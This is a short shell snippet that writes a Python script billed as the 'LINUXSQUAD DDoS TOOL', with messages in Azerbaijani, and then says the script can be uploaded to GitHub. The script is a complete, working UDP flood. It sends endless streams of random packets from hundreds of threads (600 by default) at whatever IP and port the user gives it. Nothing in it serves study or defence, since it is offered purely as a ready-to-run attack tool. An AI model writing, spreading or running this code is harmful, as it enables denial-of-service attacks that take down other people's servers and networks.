cat > ddos.py << 'EOF'
import sys
import socket
import threading
import random
import time

print("\033[92m")
print("╔════════════════════════════════════════════╗")
print("║          LINUXSQUAD DDoS TOOL              ║")
print("║               UDP FLOOD                    ║")
print("╚════════════════════════════════════════════╝")
print("\033[0m")

if len(sys.argv) < 3:
    print("\033[93mİstifadə: python ddos.py <IP> <PORT> [THREADS]\033[0m")
    print("Məsələn: python ddos.py 192.168.1.1 80 600")
    sys.exit()

target = sys.argv[1]
port = int(sys.argv[2])
threads = int(sys.argv[3]) if len(sys.argv) > 3 else 600

print(f"\033[91m[+] Hücum başlayır → {target}:{port}\033[0m")
print(f"\033[92m[+] {threads} thread aktiv...\033[0m")

def flood():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        try:
            payload = random.randbytes(random.randint(512, 2048))
            sock.sendto(payload, (target, port))
        except:
            pass

for i in range(threads):
    t = threading.Thread(target=flood, daemon=True)
    t.start()

try:
    while True:
        time.sleep(5)
except KeyboardInterrupt:
    print("\n\033[91m[-] Hücum dayandırıldı.\033[0m")
EOF

echo "Script yaradıldı. İndi GitHub-a yükləyə bilərsən."
